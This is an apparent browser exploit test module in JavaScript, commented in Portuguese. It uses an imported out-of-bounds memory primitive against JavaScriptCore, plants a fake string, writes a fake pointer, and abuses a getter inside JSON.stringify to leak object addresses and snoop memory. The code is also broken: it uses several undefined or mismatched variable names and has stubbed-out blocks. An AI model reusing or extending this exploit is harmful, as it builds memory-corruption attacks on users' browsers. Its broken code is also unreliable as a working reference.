// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, stringToAdvancedInt64Array, advancedInt64ArrayToString } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierPoisonV2";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    json_output_from_getter: null,
    leaks_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN = 0xDADADADA;
const OOB_AB_SNOOP_SIZE = 0x800; // Sondar 2KB

// Onde plantaremos nossa string falsa e o "ponteiro" para ela
const FAKE_STRING_TARGET_OFFSET_IN_OOB_AB = 0x180; // Offset para a string falsa
const FAKE_STRING_TO_PLANT = "====LEAKED_VIA_STRINGIFIER_0x1337====";
// O valor que escreveremos em CORRUPTION_OFFSET_TRIGGER, esperando que seja usado como ponteiro para string
// Este valor precisa ser o offset DENTRO DO OOB_AB onde a string está, se o Stringifier
// for levado a usar o oob_array_buffer_real como base para seus ponteiros de string.
// Se o Stringifier espera ponteiros absolutos, isso não funcionará diretamente.
// Vamos tentar com o offset relativo.
const FAKE_STRING_POINTER_VALUE_FOR_TRIGGER = new AdvancedInt64(FAKE_STRING_TARGET_OFFSET_IN_OOB_AB, 0);

let global_object_for_addrof_target; // Objeto cujo endereço queremos vazar

class CheckpointForStringifierPoisonV2 {
    constructor(id) {
        this.id_marker = `StrPoisonV2Chkpt-${id}`;
        this.property_that_might_use_poisoned_string_ptr = "DefaultValue";
        this.another_property = { complex: true, data: [1,2,3] };
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierPoisonV2_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado.", error: null,
            json_output_from_getter: null, leaks_in_oob_ab: [], details:""
        };
        let details_log = [];
        let leak_found_this_run = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB não disponíveis.");
            }

            // 1. Preencher oob_array_buffer_real com padrão
            const fill_limit = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
            logS3(`DENTRO DO GETTER: Preenchendo oob_ab de 0 a ${toHex(fill_limit)} com ${toHex(OOB_AB_FILL_PATTERN)}...`, "info", FNAME_GETTER);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                // Não sobrescrever o gatilho (0x70) nem a string falsa (0x180) com o padrão geral
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= FAKE_STRING_TARGET_OFFSET_IN_OOB_AB && offset < FAKE_STRING_TARGET_OFFSET_IN_OOB_AB + 64)) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_ab preenchido com padrão.`);

            // 2. (Re)Plantar a string falsa em FAKE_STRING_TARGET_OFFSET_IN_OOB_AB
            //    A função stringToAdvancedInt64Array é crucial aqui.
            if (typeof stringToAdvancedInt64Array === "function") {
                const fake_str_bytes_adv64 = stringToAdvancedInt64Array(FAKE_STRING_TO_PLANT, true); // true para null-terminar com Adv64.Zero
                let current_write_offset = FAKE_STRING_TARGET_OFFSET_IN_OOB_AB;
                for (const adv64_val of fake_str_bytes_adv64) {
                    if (current_write_offset + 8 <= oob_array_buffer_real.byteLength) {
                        oob_write_absolute(current_write_offset, adv64_val, 8);
                        current_write_offset += 8;
                    } else { break; }
                }
                details_log.push(`String falsa "${FAKE_STRING_TO_PLANT}" (re)plantada em oob_data[${toHex(FAKE_STRING_TARGET_OFFSET_IN_OOB_AB)}].`);
                logS3(details_log[details_log.length-1], "info", FNAME_GETTER);
            } else {
                details_log.push("AVISO: stringToAdvancedInt64Array não disponível, string falsa não plantada.");
                 logS3(details_log[details_log.length-1], "warn", FNAME_GETTER);
            }


            // 3. Criar objeto alvo para addrof e objeto de stress
            // object_for_addrof_target já foi criado no runner
            if (!object_for_addrof_target_global) {
                details_log.push("ERRO GETTER: object_for_addrof_target_global não definido!");
                throw new Error("Alvo global para addrof não definido no getter.");
            }
            
            let stress_obj_for_internal_stringify = {
                id: "StressObjectInternal",
                data_str: "DefaultDataString", // Se o Stringifier usar um ponteiro corrompido para esta string...
                target_obj_ref: object_for_addrof_target_global,
                padding: "P".repeat(100)
            };
            // Passar o `this` do getter (o checkpoint_obj original) para o stringify interno
            // pode ser interessante, já que o Stringifier já estava processando ele.
            // stress_obj_for_internal_stringify.original_checkpoint = this; 
            details_log.push(`Objeto de stress (referenciando ID ${object_for_addrof_target_global.unique_id_val}) criado.`);


            // 4. Chamar JSON.stringify internamente
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre stress_obj...", "subtest", FNAME_GETTER);
            let internal_json_out_str = "";
            try {
                internal_json_out_str = JSON.stringify(stress_obj_for_internal_stringify);
                current_test_results.stringify_output_getter = internal_json_out_str.substring(0, 500); // Salvar parte do output
                details_log.push(`Stringify interno completado. Output length: ${internal_json_out_str.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno output (primeiros 200 chars): ${internal_json_out_str.substring(0, 200)}...`, "info", FNAME_GETTER);

                // 4a. Verificar se a FAKE_STRING_TO_PLANT apareceu no output JSON
                if (internal_json_output_str.includes(FAKE_STRING_TO_PLANT)) {
                    details_log.push("SUCESSO! String Falsa VAZADA no output do JSON.stringify interno!");
                    logS3(details_log[details_log.length-1], "vuln", FNAME_GETTER);
                    leak_found_flag = true;
                }
            } catch (e_json_int) { /* ... */ }
            
            // 5. Sondar o oob_array_buffer_real por alterações
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas/vazamentos...", "info", FNAME_GETTER);
            // ... (lógica de sondagem como no teste anterior, procurando por valores != OOB_AB_FILL_PATTERN)
            // ... e por valores que pareçam ponteiros.
            for (let offset = 0; (offset + 8) <= fill_limit; offset += 4) {
                 // ... (código de sondagem da v5, verificando OOB_AB_FILL_PATTERN)
                let skip = (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                           (offset >= FAKE_STRING_TARGET_OFFSET_IN_OOB_AB && offset < FAKE_STRING_TARGET_OFFSET_IN_OOB_AB + ACTUAL_FAKE_STRING.length * 2 + 8);
                if (skip) continue;

                try {
                    const dword_val = oob_read_absolute(offset, 4);
                    if (dword_val !== OOB_AB_FILL_PATTERN) {
                        const qword_context_val = oob_read_absolute(offset, 8);
                        const leak_info = `oob_data[${toHex(offset)}] alterado! DWORD=${toHex(dword_val)}, QWORD_CTX=${qword_context_val.toString(true)}`;
                        logS3(leak_info, "leak", FNAME_GETTER);
                        current_test_results.leaks_in_oob_ab.push({offset: toHex(offset), value_hex: qword_context_val.toString(true), note: "Data Overwritten"});
                        leak_found_flag = true;
                    }
                } catch (e_snoop) {}
            }


            if (leak_found_flag) {
                current_test_results.success = true;
                current_test_results.message = "VAZAMENTO POTENCIAL! Stringifier pode ter lido/escrito em oob_ab ou string JSON continha dados inesperados.";
            } else {
                current_test_results.message = "Nenhum vazamento óbvio via Stringifier (nem na string JSON, nem no oob_ab).";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) { /* ... */ }
        return { "getter_processed_stringifier_poison_v2": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierPoisonV2.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { 
            id: this.id_marker, 
            prop_val: this.property_that_might_use_poisoned_string_ptr, 
            processed_by_str_poison_v2_test: true 
        };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierPoisonTestRunnerV2";
    logS3(`--- Iniciando Teste de Envenenamento de String do Stringifier (v2) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset */ };
    object_to_leak_address_ref_global = null;

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) { 
        logS3("Offsets Críticos Ausentes", "critical", FNAME_TEST_RUNNER); return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) {  logS3("OOB Init Falhou", "critical", FNAME_TEST_RUNNER); return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        object_to_leak_address_ref_global = { "unique_id_val": 0xABCDE000 + Math.floor(Math.random()*0xFFF) };
        logS3(`Objeto alvo global para addrof criado: ID=${toHex(object_to_leak_address_ref_global.unique_id_val)}`, "info", FNAME_TEST_RUNNER);

        // 1. Plantar a STRING FALSA no oob_array_buffer_real em FAKE_STRING_TARGET_OFFSET_IN_OOB_AB (ex: 0x180)
        if (typeof stringToAdvancedInt64Array === "function") {
            const fake_str_byte_array = stringToAdvancedInt64Array(ACTUAL_FAKE_STRING, true); // null-terminate
            let write_at = FAKE_STRING_TARGET_OFFSET_IN_OOB_AB;
            for(const adv64 of fake_str_byte_array) {
                oob_write_absolute(write_at, adv64, 8);
                write_at += 8;
            }
            logS3(`String falsa "${ACTUAL_FAKE_STRING}" plantada em oob_data[${toHex(FAKE_STRING_TARGET_OFFSET_IN_OOB_AB)}]`, "info", FNAME_TEST_RUNNER);
        } else {
            logS3("AVISO: stringToAdvancedInt64Array não disponível. String falsa não plantada.", "warn", FNAME_TEST_RUNNER);
        }

        // 2. Escrita OOB Gatilho: Escrever o FAKE_STRING_POINTER_VALUE_FOR_TRIGGER (que é FAKE_STRING_TARGET_OFFSET_IN_OOB_AB)
        //    no CORRUPTION_OFFSET_TRIGGER (0x70).
        logS3(`Escrevendo "ponteiro falso" ${FAKE_STRING_POINTER_VALUE_FOR_TRIGGER.toString(true)} em oob_data[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_TEST_RUNNER);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, FAKE_STRING_POINTER_VALUE_FOR_TRIGGER, 8);
        logS3(`Escrita OOB gatilho com ponteiro falso completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierPoisonV2(1);
        checkpoint_obj.prop_for_stringifier_target = object_to_leak_address_ref_global;
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output_ext = "";
        try {
            final_json_output_ext = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Output (parcial): ${final_json_output_ext.substring(0,300)}...`, "info", FNAME_TEST_RUNNER);
            
            // Verificar se a string FALSA apareceu no output JSON EXTERNO
            if (final_json_output_ext.includes(ACTUAL_FAKE_STRING)) {
                if(current_test_results) { // Pode ser null se o getter não foi chamado
                    current_test_results.success = true;
                    current_test_results.message = (current_test_results.message || "") + " SUCESSO! String Falsa VAZADA no output JSON EXTERNO!";
                }
                logS3("SUCESSO! String Falsa VAZADA no output JSON EXTERNO!", "vuln", FNAME_TEST_RUNNER);
            }

        } catch (e_ext_json) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRING POISON (v2): SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRING POISON (v2): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        // ... (logging detalhado de current_test_results.leaks_in_json_output e leaks_in_oob_ab)
        if (current_test_results.leaks_in_json_output && current_test_results.leaks_in_json_output.length > 0) {
             logS3("--- Ponteiros Especulativos na String JSON (do Getter) ---", "leak", FNAME_TEST_RUNNER);
             current_test_results.leaks_in_json_output.forEach(p => logS3(`  ${p}`, "leak", FNAME_TEST_RUNNER));
        }
        if (current_test_results.leaks_in_oob_ab && current_test_results.leaks_in_oob_ab.length > 0) {
            logS3("--- Dados Alterados/Ponteiros Vazados no oob_array_buffer_real (do Getter) ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_oob_ab.forEach(item => {
                logS3(`  Offset ${item.offset}: ${item.value} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }

    } else { /* ... */ }

    clearOOBEnvironment();
    global_object_to_leak_address_ref_global = null;
    logS3(`--- Teste de Envenenamento de String do Stringifier (v2) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
